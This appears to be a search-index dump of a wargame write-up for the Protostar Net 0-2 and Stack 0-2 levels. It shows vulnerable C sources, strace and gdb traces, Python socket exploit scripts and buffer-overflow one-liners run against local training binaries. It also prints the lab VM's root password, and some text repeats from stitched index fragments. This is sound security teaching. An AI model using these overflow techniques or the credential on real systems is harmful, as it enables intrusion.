\u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u51fd\u6570 accept \u8fd4\u56de 1 2 3 4 5 6 7 8 9 10 11 12 accept ( 3 , { sa_family = AF_INET, sin_port = htons ( 36218 ) , sin_addr = inet_addr ( \"127.0.0.1\" )} , [ 16 ]) = 4 clone ( Process 18005 attached # \u518d\u6b21\u8c03\u7528 clone\uff0c\u4ece\u800c\u80fd\u652f\u6301\u591a\u7528\u6237\u5e76\u53d1 child_stack = 0 , flags = CLONE_CHILD_CLEARTID | CLONE_CHILD_SETTID | SIGCHLD, child_tidptr = 0xb7e96728 ) = 18005 [ pid 17964 ] close ( 4 ) = 0 [ pid 17964 ] accept ( 3 , <unfinished ...> [ pid 18005 ] close ( 3 ) = 0 [ pid 18005 ] dup2 ( 4 , 0 ) = 0 [ pid 18005 ] dup2 ( 4 , 1 ) = 1 [ pid 18005 ] dup2 ( 4 , 2 ) = 2 [ pid 18005 ] time ( NULL ) = 1662378390 [ pid 18005 ] write ( 1 , \"Please send '1923281790' as a li\" ..., 54 ) = 54 # printf [ pid 18005 ] read ( 0 , \u5b58\u5728\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u9700\u8981\u501f\u52a9\u4e8e echo \u6216 python \uff0c\u4f46\u7531\u4e8e\u6570\u5b57\u968f\u673a\u751f\u6210\uff0c\u4e0d\u80fd\u76f4\u63a5\u786c\u7f16\u7801\uff0c\u53ef\u4ee5\u501f\u52a9\u4e8e cat Exploit \u00b6 1 2 3 4 $ echo -e \"`cat | python -c \" import struct ; print ( struct.pack ( 'I' , int ( input ()))) \"`\" | nc localhost 2999 Please send '2035797908' as a little endian 32bit int 2035797908 # Enter + Ctrl_D, which will closes cat and echo Thank you sir/madam Net 1 \u00b6 convert binary integers into ascii representation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #include \"../common/common.c\" #define NAME \"net1\" #define UID 998 #define GID 998 #define PORT 2998 void run () { char buf [ 12 ]; char fub [ 12 ]; char * q ; unsigned int wanted ; wanted = random (); sprintf ( fub , \"%d\" , wanted ); // the binary string is sent if ( write ( 0 , & wanted , sizeof ( wanted )) != sizeof ( wanted )) { errx ( 1 , \":( \\n \" ); } if ( fgets ( buf , sizeof ( buf ) -1 , stdin ) == NULL ) { errx ( 1 , \":( \\n \" ); } // strchr - locate character in string q = strchr ( buf , '\\r' ); if ( q ) * q = 0 ; q = strchr ( buf , '\\n' ); if ( q ) * q = 0 ; if ( strcmp ( fub , buf ) == 0 ) { printf ( \"you correctly sent the data \\n \" ); } else { printf ( \"you didn't send the data properly \\n \" ); } } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); /* Don't do this :> */ srandom ( time ( NULL )); // If we send fast enough, the seconds will be the same // thus produce the same pseudo random number run (); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 import socket , struct # \u53ef\u4ee5\u4e0e strace nc -l <port> \u5bf9\u6bd4 s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2998 )) wanted = s . recv ( 4 ) # 4 bytes num_wanted = str ( struct . unpack ( 'I' , wanted )[ 0 ]) s . sendall ( num_wanted ) print 'Receive: ' + wanted print 'Send: ' + num_wanted print s . recv ( 1024 ) 1 2 3 4 $ python /tmp/net.py Receive: \ufffd\ufffdW Send: 1473381877 you correctly sent the data References \u00b6 socket - Example Net 2 \u00b6 add up 4 unsigned 32-bit integers 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #include \"../common/common.c\" #define NAME \"net2\" #define UID 997 #define GID 997 #define PORT 2997 void run () { unsigned int quad [ 4 ]; int i ; unsigned int result , wanted ; result = 0 ; for ( i = 0 ; i < 4 ; i ++ ) { quad [ i ] = random (); result += quad [ i ]; // \u53ef\u80fd\u6709\u6ea2\u51fa if ( write ( 0 , & ( quad [ i ]), sizeof ( result )) != sizeof ( result )) { errx ( 1 , \":( \\n \" ); } } if ( read ( 0 , & wanted , sizeof ( result )) != sizeof ( result )) { errx ( 1 , \":< \\n \" ); } if ( result == wanted ) { printf ( \"you added them correctly \\n \" ); } else { printf ( \"sorry, try again. invalid \\n \" ); } } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); /* Don't do this :> */ srandom ( time ( NULL )); run (); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import socket , struct s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2997 )) result = '' for i in range ( 4 ): result += s . recv ( 4 ) nums = struct . unpack ( 'IIII' , result ) sm = 0 for num in nums : sm += num ans = struct . pack ( 'I' , sm & 0xffffffff ) s . sendall ( ans ) print 'Receive: ' + result print 'Send: ' + ans print s . recv ( 1024 ) 1 2 3 4 5 $ python /tmp/net.py Receive: \ufffd\ufffdiv\ufffdc\ufffd\ufffd> z\ufffdP Send: \ufffd\ufffd\ufffd you added them correctly","title":"Net"},{"location":"wargames/protostar/net/#net-0","text":"converting strings to little endian integers 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include \"../common/common.c\" #define NAME \"net0\" #define UID 999 #define GID 999 #define PORT 2999 void run () { unsigned int i ; unsigned int wanted ; wanted = random (); printf ( \"Please send '%d' as a little endian 32bit int \\n \" , wanted ); if ( fread ( & i , sizeof ( i ), 1 , stdin ) == NULL ) { // fread from stdin errx ( 1 , \":( \\n \" ); } if ( i == wanted ) { printf ( \"Thank you sir/madam \\n \" ); } else { printf ( \"I'm sorry, you sent %d instead \\n \" , i ); } } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); // deamonizes by cloning itself and killing the parent /* Wait for socket activity and return */ fd = serve_forever ( PORT ); // listen on port 2999 for TCP connections /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); /* Don't do this :> */ srandom ( time ( NULL )); run (); } \u5728\u5f00\u59cb\u505a\u4e4b\u524d\uff0c\u6ce8\u610f\u5230 net0 \u5df2\u5728\u8fd0\u884c\u4e2d 1 2 3 $ ps aux | grep net0 999 1503 0 .0 0 .0 1532 272 ? Ss Sep02 0 :00 /opt/protostar/bin/net0 user 17387 0 .0 0 .0 3272 644 pts/0 S+ 01 :16 0 :00 grep net0 \u53ef\u4ee5\u5207\u6362\u5230 root \u4ee5\u4fbf\u91cd\u65b0\u542f\u52a8 net0 \uff0c\u7528\u6237\u540d\u5bc6\u7801 root:godmode \u6740\u6389\u539f\u5148\u7684 net0 \u8fdb\u7a0b\uff0c\u901a\u8fc7 strace \u542f\u52a8\uff0c\u6ce8\u610f\u5230\u6700\u540e\u8c03\u7528\u4e86\u51fd\u6570 clone() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # kill 1503 # strace ./net0 execve ( \"./net0\" , [ \"./net0\" ] , [ /* 24 vars */ ]) = 0 brk ( 0 ) = 0x804b000 access ( \"/etc/ld.so.nohwcap\" , F_OK ) = -1 ENOENT ( No such file or directory ) mmap2 ( NULL, 8192 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 ) = 0xb7fe0000 access ( \"/etc/ld.so.preload\" , R_OK ) = -1 ENOENT ( No such file or directory ) open ( \"/etc/ld.so.cache\" , O_RDONLY ) = 3 fstat64 ( 3 , { st_mode = S_IFREG | 0644 , st_size = 13796 , ... }) = 0 mmap2 ( NULL, 13796 , PROT_READ, MAP_PRIVATE, 3 , 0 ) = 0xb7fdc000 close ( 3 ) = 0 access ( \"/etc/ld.so.nohwcap\" , F_OK ) = -1 ENOENT ( No such file or directory ) open ( \"/lib/libc.so.6\" , O_RDONLY ) = 3 read ( 3 , \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\320m\\1\\0004\\0\\0\\0\" ..., 512 ) = 512 fstat64 ( 3 , { st_mode = S_IFREG | 0755 , st_size = 1319176 , ... }) = 0 mmap2 ( NULL, 1329480 , PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_DENYWRITE, 3 , 0 ) = 0xb7e97000 mprotect ( 0xb7fd5000, 4096 , PROT_NONE ) = 0 mmap2 ( 0xb7fd6000, 12288 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_DENYWRITE, 3 , 0x13e ) = 0xb7fd6000 mmap2 ( 0xb7fd9000, 10568 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0 ) = 0xb7fd9000 close ( 3 ) = 0 mmap2 ( NULL, 4096 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 ) = 0xb7e96000 set_thread_area ({ entry_number:-1 -> 6 , base_addr:0xb7e966c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1 }) = 0 mprotect ( 0xb7fd6000, 8192 , PROT_READ ) = 0 mprotect ( 0xb7ffe000, 4096 , PROT_READ ) = 0 munmap ( 0xb7fdc000, 13796 ) = 0 rt_sigaction ( SIGCHLD, { 0x8048dc4, [ CHLD ] , SA_RESTART } , { SIG_DFL, [] , 0 } , 8 ) = 0 rt_sigaction ( SIGPIPE, { SIG_IGN, [ PIPE ] , SA_RESTART } , { SIG_DFL, [] , 0 } , 8 ) = 0 open ( \"/opt/protostar/run/net0.pid\" , O_RDWR | O_CREAT | O_TRUNC, 0700 ) = 3 setgroups32 ( 1 , [ 999 ]) = 0 setresgid32 ( 999 , 999 , 999 ) = 0 setresuid32 ( 999 , 999 , 999 ) = 0 clone ( child_stack = 0 , flags = CLONE_CHILD_CLEARTID | CLONE_CHILD_SETTID | SIGCHLD, child_tidptr = 0xb7e96728 ) = 17420 # clone() \u5c06\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u662f\u81ea\u8eab\u7684\u514b\u9686 # \u8fd4\u56de\u503c 17420 \u4e3a\u65b0\u8fdb\u7a0b\u7684 PID exit_group ( 0 ) = ? # \u7236\u8fdb\u7a0b\u9000\u51fa\uff0c\u7559\u4e0b\u5b50\u8fdb\u7a0b net0 \u901a\u8fc7 -f \u6765\u8ddf\u8e2a\u5b50\u8fdb\u7a0b\uff0c\u56e0\u4e3a\u6ca1\u6709\u6740\u6389\u521a\u521b\u5efa\u7684\u8fdb\u7a0b\uff0c\u6240\u4ee5\u63d0\u793a Address already in use 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 # -f -- follow forks # strace -f ./net0 execve ( \"./net0\" , [ \"./net0\" ] , [ /* 24 vars */ ]) = 0 brk ( 0 ) = 0x804b000 access ( \"/etc/ld.so.nohwcap\" , F_OK ) = -1 ENOENT ( No such file or directory ) mmap2 ( NULL, 8192 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 ) = 0xb7fe0000 access ( \"/etc/ld.so.preload\" , R_OK ) = -1 ENOENT ( No such file or directory ) open ( \"/etc/ld.so.cache\" , O_RDONLY ) = 3 fstat64 ( 3 , { st_mode = S_IFREG | 0644 , st_size = 13796 , ... }) = 0 mmap2 ( NULL, 13796 , PROT_READ, MAP_PRIVATE, 3 , 0 ) = 0xb7fdc000 close ( 3 ) = 0 access ( \"/etc/ld.so.nohwcap\" , F_OK ) = -1 ENOENT ( No such file or directory ) open ( \"/lib/libc.so.6\" , O_RDONLY ) = 3 read ( 3 , \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\320m\\1\\0004\\0\\0\\0\" ..., 512 ) = 512 fstat64 ( 3 , { st_mode = S_IFREG | 0755 , st_size = 1319176 , ... }) = 0 mmap2 ( NULL, 1329480 , PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_DENYWRITE, 3 , 0 ) = 0xb7e97000 mprotect ( 0xb7fd5000, 4096 , PROT_NONE ) = 0 mmap2 ( 0xb7fd6000, 12288 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_DENYWRITE, 3 , 0x13e ) = 0xb7fd6000 mmap2 ( 0xb7fd9000, 10568 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0 ) = 0xb7fd9000 close ( 3 ) = 0 mmap2 ( NULL, 4096 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 ) = 0xb7e96000 set_thread_area ({ entry_number:-1 -> 6 , base_addr:0xb7e966c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1 }) = 0 mprotect ( 0xb7fd6000, 8192 , PROT_READ ) = 0 mprotect ( 0xb7ffe000, 4096 , PROT_READ ) = 0 munmap ( 0xb7fdc000, 13796 ) = 0 rt_sigaction ( SIGCHLD, { 0x8048dc4, [ CHLD ] , SA_RESTART } , { SIG_DFL, [] , 0 } , 8 ) = 0 rt_sigaction ( SIGPIPE, { SIG_IGN, [ PIPE ] , SA_RESTART } , { SIG_DFL, [] , 0 } , 8 ) = 0 open ( \"/opt/protostar/run/net0.pid\" , O_RDWR | O_CREAT | O_TRUNC, 0700 ) = 3 # 3 for filedescriptor setgroups32 ( 1 , [ 999 ]) = 0 setresgid32 ( 999 , 999 , 999 ) = 0 setresuid32 ( 999 , 999 , 999 ) = 0 clone ( Process 17423 attached child_stack = 0 , flags = CLONE_CHILD_CLEARTID | CLONE_CHILD_SETTID | SIGCHLD, child_tidptr = 0xb7e96728 ) = 17423 [ pid 17422 ] exit_group ( 0 ) = ? # parent exit setsid () = 17423 # attached to the new process chdir ( \"/\" ) = 0 open ( \"/dev/null\" , O_RDWR ) = 4 fstat64 ( 4 , { st_mode = S_IFCHR | 0666 , st_rdev = makedev ( 1 , 3 ) , ... }) = 0 dup2 ( 4 , 0 ) = 0 # stdin dup2 ( 4 , 1 ) = 1 # stdout dup2 ( 4 , 2 ) = 2 # stderr # bend all standard streams to /dev/null close ( 4 ) = 0 write ( 3 , \"17423\\n\" , 6 ) = 6 # write child's process id to net0.pid close ( 3 ) = 0 socket ( PF_INET, SOCK_STREAM, IPPROTO_IP ) = 3 setsockopt ( 3 , SOL_SOCKET, SO_REUSEADDR, [ 1 ] , 4 ) = 0 bind ( 3 , { sa_family = AF_INET, sin_port = htons ( 2999 ) , sin_addr = inet_addr ( \"0.0.0.0\" )} , 16 ) = -1 EADDRINUSE ( Address already in use ) # bind this process to port 2999 write ( 2 , \"serve_forever: unable to bind():\" ..., 56 ) = 56 exit_group ( 6 ) = ? Process 17423 detached \u91cd\u65b0\u542f\u52a8 net0 \u5e76\u8ddf\u8e2a 1 2 3 4 5 6 7 8 9 # killall net0 # strace -f ./net0 execve ( \"./net0\" , [ \"./net0\" ] , [ /* 24 vars */ ]) = 0 ... socket ( PF_INET, SOCK_STREAM, IPPROTO_IP ) = 3 setsockopt ( 3 , SOL_SOCKET, SO_REUSEADDR, [ 1 ] , 4 ) = 0 bind ( 3 , { sa_family = AF_INET, sin_port = htons ( 2999 ) , sin_addr = inet_addr ( \"0.0.0.0\" )} , 16 ) = 0 listen ( 3 , 10 ) = 0 # listen on the port accept ( 3 , # waiting for a packet to arrive \u53e6\u8d77\u4e00\u4e2a\u7ec8\u7aef\uff0c\u901a\u8fc7 netstat \u67e5\u627e\u76d1\u542c\u8fdb\u7a0b 1 2 3 4 5 6 7 8 9 10 11 12 13 # netstat -plant # -p, --programs - display PID/Program name for sockets # -l, --listening - display listening server sockets # -a, --all, --listening - display all sockets (default: connected) # -n, --numeric - don't resolve names # <Socket>={-t|--tcp} Active Internet connections ( servers and established ) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name ... tcp 0 0 0 .0.0.0:2998 0 .0.0.0:* LISTEN 1507 /net1 tcp 0 0 0 .0.0.0:2999 0 .0.0.0:* LISTEN 17964 /net0 tcp 0 0 127 .0.0.1:25 0 .0.0.0:* LISTEN 1479 /exim4 ... nc \u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u51fd\u6570 accept \u8fd4\u56de 1 2 3 4 5 6 7 8 9 10 11 12 accept ( 3 , { sa_family = AF_INET, sin_port = htons ( 36218 ) , sin_addr = inet_addr ( \"127.0.0.1\" )} , [ 16 ]) = 4 clone ( Process 18005 attached # \u518d\u6b21\u8c03\u7528 clone\uff0c\u4ece\u800c\u80fd\u652f\u6301\u591a\u7528\u6237\u5e76\u53d1 child_stack = 0 , flags = CLONE_CHILD_CLEARTID | CLONE_CHILD_SETTID | SIGCHLD, child_tidptr = 0xb7e96728 ) = 18005 [ pid 17964 ] close ( 4 ) = 0 [ pid 17964 ] accept ( 3 , <unfinished ...> [ pid 18005 ] close ( 3 ) = 0 [ pid 18005 ] dup2 ( 4 , 0 ) = 0 [ pid 18005 ] dup2 ( 4 , 1 ) = 1 [ pid 18005 ] dup2 ( 4 , 2 ) = 2 [ pid 18005 ] time ( NULL ) = 1662378390 [ pid 18005 ] write ( 1 , \"Please send '1923281790' as a li\" ..., 54 ) = 54 # printf [ pid 18005 ] read ( 0 , \u5b58\u5728\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u9700\u8981\u501f\u52a9\u4e8e echo \u6216 python \uff0c\u4f46\u7531\u4e8e\u6570\u5b57\u968f\u673a\u751f\u6210\uff0c\u4e0d\u80fd\u76f4\u63a5\u786c\u7f16\u7801\uff0c\u53ef\u4ee5\u501f\u52a9\u4e8e cat","title":"Net 0"},{"location":"wargames/protostar/net/#exploit","text":"1 2 3 4 $ echo -e \"`cat | python -c \" import struct ; print ( struct.pack ( 'I' , int ( input ()))) \"`\" | nc localhost 2999 Please send '2035797908' as a little endian 32bit int 2035797908 # Enter + Ctrl_D, which will closes cat and echo Thank you sir/madam","title":"Exploit"},{"location":"wargames/protostar/net/#net-1","text":"convert binary integers into ascii representation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #include \"../common/common.c\" #define NAME \"net1\" #define UID 998 #define GID 998 #define PORT 2998 void run () { char buf [ 12 ]; char fub [ 12 ]; char * q ; unsigned int wanted ; wanted = random (); sprintf ( fub , \"%d\" , wanted ); // the binary string is sent if ( write ( 0 , & wanted , sizeof ( wanted )) != sizeof ( wanted )) { errx ( 1 , \":( \\n \" ); } if ( fgets ( buf , sizeof ( buf ) -1 , stdin ) == NULL ) { errx ( 1 , \":( \\n \" ); } // strchr - locate character in string q = strchr ( buf , '\\r' ); if ( q ) * q = 0 ; q = strchr ( buf , '\\n' ); if ( q ) * q = 0 ; if ( strcmp ( fub , buf ) == 0 ) { printf ( \"you correctly sent the data \\n \" ); } else { printf ( \"you didn't send the data properly \\n \" ); } } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); /* Don't do this :> */ srandom ( time ( NULL )); // If we send fast enough, the seconds will be the same // thus produce the same pseudo random number run (); }","title":"Net 1"},{"location":"wargames/protostar/net/#exploit_1","text":"1 2 3 4 5 6 7 8 9 10 11 import socket , struct # \u53ef\u4ee5\u4e0e strace nc -l <port> \u5bf9\u6bd4 s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2998 )) wanted = s . recv ( 4 ) # 4 bytes num_wanted = str ( struct . unpack ( 'I' , wanted )[ 0 ]) s . sendall ( num_wanted ) print 'Receive: ' + wanted print 'Send: ' + num_wanted print s . recv ( 1024 ) 1 2 3 4 $ python /tmp/net.py Receive: \ufffd\ufffdW Send: 1473381877 you correctly sent the data","title":"Exploit"},{"location":"wargames/protostar/net/#references","text":"socket - Example","title":"References"},{"location":"wargames/protostar/net/#net-2","text":"add up 4 unsigned 32-bit integers 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #include \"../common/common.c\" #define NAME \"net2\" #define UID 997 #define GID 997 #define PORT 2997 void run () { unsigned int quad [ 4 ]; int i ; unsigned int result , wanted ; result = 0 ; for ( i = 0 ; i < 4 ; i ++ ) { quad [ i ] = random (); result += quad [ i ]; // \u53ef\u80fd\u6709\u6ea2\u51fa if ( write ( 0 , & ( quad [ i ]), sizeof ( result )) != sizeof ( result )) { errx ( 1 , \":( \\n \" ); } } if ( read ( 0 , & wanted , sizeof ( result )) != sizeof ( result )) { errx ( 1 , \":< \\n \" ); } if ( result == wanted ) { printf ( \"you added them correctly \\n \" ); } else { printf ( \"sorry, try again. invalid \\n \" ); } } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); /* Don't do this :> */ srandom ( time ( NULL )); run (); }","title":"Net 2"},{"location":"wargames/protostar/net/#exploit_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import socket , struct s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2997 )) result = '' for i in range ( 4 ): result += s . recv ( 4 ) nums = struct . unpack ( 'IIII' , result ) sm = 0 for num in nums : sm += num ans = struct . pack ( 'I' , sm & 0xffffffff ) s . sendall ( ans ) print 'Receive: ' + result print 'Send: ' + ans print s . recv ( 1024 ) 1 2 3 4 5 $ python /tmp/net.py Receive: \ufffd\ufffdiv\ufffdc\ufffd\ufffd> z\ufffdP Send: \ufffd\ufffd\ufffd you added them correctly","title":"Exploit"},{"location":"wargames/protostar/stack/","text":"The levels to be exploited can be found in the /opt/protostar/bin directory. Stack 0 \u00b6 memory can be accessed outside of its allocated region 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include <stdlib.h> #include <unistd.h> #include <stdio.h> int main ( int argc , char ** argv ) { volatile int modified ; // volatile tells the compiler not to cache the value of `modified` char buffer [ 64 ]; modified = 0 ; gets ( buffer ); // Never use gets(). // Because it's impossible to tell without knowing the data in advance // how many characters gets() will read, and gets() will continue to // store characters past the end of the buffer if ( modified != 0 ) { printf ( \"you have changed the 'modified' variable \\n \" ); } else { printf ( \"Try again? \\n \" ); } } Dump of assembler code for function main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x080483f4 <main+0>: push ebp 0x080483f5 <main+1>: mov ebp,esp 0x080483f7 <main+3>: and esp,0xfffffff0 0x080483fa <main+6>: sub esp,0x60 0x080483fd <main+9>: mov DWORD PTR [ esp+0x5c ] ,0x0 # modified = 0 0x08048405 <main+17>: lea eax, [ esp+0x1c ] 0x08048409 <main+21>: mov DWORD PTR [ esp ] ,eax # passing the address of buffer to gets() 0x0804840c <main+24>: call 0x804830c <gets@plt> 0x08048411 <main+29>: mov eax,DWORD PTR [ esp+0x5c ] # starting to check the value of modified 0x08048415 <main+33>: test eax,eax 0x08048417 <main+35>: je 0x8048427 <main+51> 0x08048419 <main+37>: mov DWORD PTR [ esp ] ,0x8048500 0x08048420 <main+44>: call 0x804832c <puts@plt> 0x08048425 <main+49>: jmp 0x8048433 <main+63> 0x08048427 <main+51>: mov DWORD PTR [ esp ] ,0x8048529 0x0804842e <main+58>: call 0x804832c <puts@plt> 0x08048433 <main+63>: leave 0x08048434 <main+64>: ret End of assembler dump. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 ( gdb ) break *0x0804840c Breakpoint 2 at 0x804840c: file stack0/stack0.c, line 11 . ( gdb ) break *0x08048411 Breakpoint 3 at 0x8048411: file stack0/stack0.c, line 13 . ( gdb ) define hook-stop # define a hook, some commands will be executed when stops # Note: some unimportant output parts are omitted below Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >info registers >x/24wx $esp >x/2i $eip >end ( gdb ) r Starting program: /opt/protostar/bin/stack0 ( gdb ) c Continuing. THISISTHEINPUT # 544849534953544845494e505554 eax 0xbffff65c -1073744292 ecx 0xbffff65c -1073744292 edx 0xb7fd9334 -1208118476 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff640 0xbffff640 ebp 0xbffff6a8 0xbffff6a8 esi 0x0 0 edi 0x0 0 eip 0x8048411 0x8048411 <main+29> eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 0xbffff640: 0xbffff65c 0x00000001 0xb7fff8f8 0xb7f0186e 0xbffff650: 0xb7fd7ff4 0xb7ec6165 0xbffff668 0x53494854 # start from here 0xbffff660: 0x48545349 0x504e4945 0xbf005455 0x080482e8 0xbffff670: 0xb7ff1040 0x08049620 0xbffff6a8 0x08048469 0xbffff680: 0xb7fd8304 0xb7fd7ff4 0x08048450 0xbffff6a8 0xbffff690: 0xb7ec6365 0xb7ff1040 0x0804845b 0x00000000 # need at least 16 bytes + 1 bit to overwrite the value of `modified` 0x8048411 <main+29>: mov eax,DWORD PTR [ esp+0x5c ] 0x8048415 <main+33>: test eax,eax Breakpoint 3 , main ( argc = 1 , argv = 0xbffff754 ) at stack0/stack0.c:13 13 in stack0/stack0.c ( gdb ) x/wx $esp +0x5c # check the value of `modified` 0xbffff69c: 0x00000000 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 ( gdb ) r The program being debugged has been started already. Start it from the beginning? ( y or n ) y Starting program: /opt/protostar/bin/stack0 ( gdb ) c Continuing. 123456789012345678901234567890123456789012345678901234567890ABCDE eax 0xbffff65c -1073744292 ecx 0xbffff65c -1073744292 edx 0xb7fd9334 -1208118476 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff640 0xbffff640 ebp 0xbffff6a8 0xbffff6a8 esi 0x0 0 edi 0x0 0 eip 0x8048411 0x8048411 <main+29> eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 0xbffff640: 0xbffff65c 0x00000001 0xb7fff8f8 0xb7f0186e 0xbffff650: 0xb7fd7ff4 0xb7ec6165 0xbffff668 0x34333231 0xbffff660: 0x38373635 0x32313039 0x36353433 0x30393837 0xbffff670: 0x34333231 0x38373635 0x32313039 0x36353433 0xbffff680: 0x30393837 0x34333231 0x38373635 0x32313039 0xbffff690: 0x36353433 0x30393837 0x44434241 0x00000045 0x8048411 <main+29>: mov eax,DWORD PTR [ esp+0x5c ] 0x8048415 <main+33>: test eax,eax Breakpoint 3 , main ( argc = 1 , argv = 0xbffff754 ) at stack0/stack0.c:13 13 in stack0/stack0.c ( gdb ) x/wx $esp +0x5c 0xbffff69c: 0x00000045 ( gdb ) c Continuing. you have changed the 'modified' variable Exploit \u00b6 1 2 $ python -c 'print(\"A\" * 65)' | ./stack0 you have changed the 'modified' variable Stack 1 \u00b6 Protostar is little endian 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; if ( argc == 1 ) { errx ( 1 , \"please specify an argument \\n \" ); } modified = 0 ; strcpy ( buffer , argv [ 1 ]); if ( modified == 0x61626364 ) { // 'dcba' in little endian printf ( \"you have correctly got the variable to the right value \\n \" ); } else { printf ( \"Try again, you got 0x%08x \\n \" , modified ); } } Exploit \u00b6 1 2 $ ./stack1 $( python -c 'print(\"A\" * 64 + \"dcba\")' ) you have correctly got the variable to the right value Stack 2 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; char * variable ; variable = getenv ( \"GREENIE\" ); if ( variable == NULL ) { errx ( 1 , \"please set the GREENIE environment variable \\n \" ); } modified = 0 ; strcpy ( buffer , variable ); if ( modified == 